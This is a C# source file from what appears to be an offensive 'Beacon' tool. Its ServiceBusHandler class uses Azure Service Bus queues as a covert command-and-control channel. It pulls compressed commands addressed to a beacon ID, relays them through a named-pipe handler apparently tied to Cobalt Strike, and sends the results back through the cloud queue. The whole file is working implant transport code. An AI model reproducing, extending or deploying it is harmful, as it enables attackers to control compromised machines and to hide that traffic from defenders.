using Microsoft.Azure.ServiceBus.Management;
using Azure.Messaging.ServiceBus;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Beacon.Handlers;
using Newtonsoft.Json;
using Beacon.Models;

namespace Beacon.Handlers
{
    public class ServiceBusHandler
    {
        public static string OutboundQueueName = "C2";
        public static string InboudboundQueueName = "BE";
        public static string baseQueueName = Program.baseQueueName;

        public string ConnectionString { get; set; }
        public string QueueName { get; set; }
        public string BeaconId { get; set; }
        public bool Initiliazed { get; set; }
        public ServiceBusClient client { get; set; }
        public NamePipeHandler NamePipeHandler { get; set; }
        public ServiceBusProcessor processor { get; set; }

        public ServiceBusHandler(string connectionString, string queueName, string beaconId, NamePipeHandler cobaltHandler)
        {
            ConnectionString = connectionString;
            NamePipeHandler = cobaltHandler;
            QueueName = queueName;
            //orchestrationQueueName = queueName;
            BeaconId = beaconId;
            client = new ServiceBusClient(ConnectionString);
        }

        // handle received messages
        public async Task MessageHandler(ProcessMessageEventArgs args)
        {
            //Put all relevant messages into the database for handling
            //Compress Data
            var decom = SevenZip.SevenZipExtractor.ExtractBytes(args.Message.Body.ToArray());

            var beaconMsg = JsonConvert.DeserializeObject<BeaconMsg>(Encoding.UTF8.GetString(decom));

            if (beaconMsg != null)
            {
                if (beaconMsg.To.Equals(BeaconId))
                {
                    // complete the message. messages is deleted from the queue. 
                    await args.CompleteMessageAsync(args.Message);

                    //Process the response
                    var responseMsg = NamePipeHandler.ProcessMessage(beaconMsg);

                    await SendMessageAsync(responseMsg.beaconMsg.Queue, JsonConvert.SerializeObject(responseMsg.beaconMsg));

                    if (QueueName.Equals(baseQueueName))
                    {
                        QueueName = responseMsg.beaconMsg.Queue;

                        Initiliazed = responseMsg.stopHandler;

                        Console.WriteLine($"[+] Stopping handler for {QueueName}");
                        await processor.StopProcessingAsync();
                    }
                }
            }
        }

        // handle any errors when receiving messages
        public Task ErrorHandler(ProcessErrorEventArgs args)
        {
            Console.WriteLine(args.Exception.ToString());
            return Task.CompletedTask;
        }

        public async Task ReceiveMessageManualAsync(string queueName)
        {
            var reciver = client.CreateReceiver(queueName);

            var serviceBusMsg = await reciver.ReceiveMessageAsync(TimeSpan.FromSeconds(2));

            if (serviceBusMsg != null)
            {
                var beaconMsg = JsonConvert.DeserializeObject<BeaconMsg>(serviceBusMsg.Body.ToString());

                if (beaconMsg != null)
                {
                    if (beaconMsg.To.Equals(BeaconId))
                    {
                        //Process the response
                        var responseMsg = NamePipeHandler.ProcessMessage(beaconMsg);

                        // complete the message. messages is deleted from the queue. 
                        await reciver.CompleteMessageAsync(serviceBusMsg);

                        if (!string.IsNullOrEmpty(responseMsg.beaconMsg.Payload))
                            await SendMessageAsync(responseMsg.beaconMsg.Queue, JsonConvert.SerializeObject(responseMsg.beaconMsg));

                        if (QueueName.Equals(baseQueueName))
                        {
                            QueueName = responseMsg.beaconMsg.Queue;

                            Initiliazed = responseMsg.stopHandler;

                            Console.WriteLine($"[+] Stopping handler for {QueueName}");
                            await processor.StopProcessingAsync();
                        }
                    }
                }
            }
        }

        public async Task ReceiveMessagesAsync(string queueName)
        {

            // create a processor that we can use to process the messages
            processor = client.CreateProcessor(queueName + InboudboundQueueName, new ServiceBusProcessorOptions());

            // add handler to process messages
            processor.ProcessMessageAsync += MessageHandler;

            // add handler to process any errors
            processor.ProcessErrorAsync += ErrorHandler;


            // start processing 
            await processor.StartProcessingAsync();




        }


        public async Task SendMessageAsync(string queueName, string messageData)
        {

            // create a sender for the queue 
            ServiceBusSender sender = client.CreateSender(queueName + OutboundQueueName);

            //Compress Data
            var compressed = SevenZip.SevenZipCompressor.CompressBytes(Encoding.UTF8.GetBytes(messageData));

            // create a message that we can send
            ServiceBusMessage message = new ServiceBusMessage(compressed);


            // send the message
            await sender.SendMessageAsync(message);


        }

        public async Task<List<string>> ListQueues()
        {
            var managementClient = new ManagementClient(ConnectionString);

            var allQueues = await managementClient.GetQueuesAsync();

            return allQueues.Select(x => x.Path).ToList();


        }

        public async Task<bool> CreateQueue(string queueName)
        {
            try
            {
                var managementClient = new ManagementClient(ConnectionString);

                await managementClient.CreateQueueAsync(queueName);

                return true;
            }
            catch (Exception)
            {

                return false;
            }
        }
    }
}
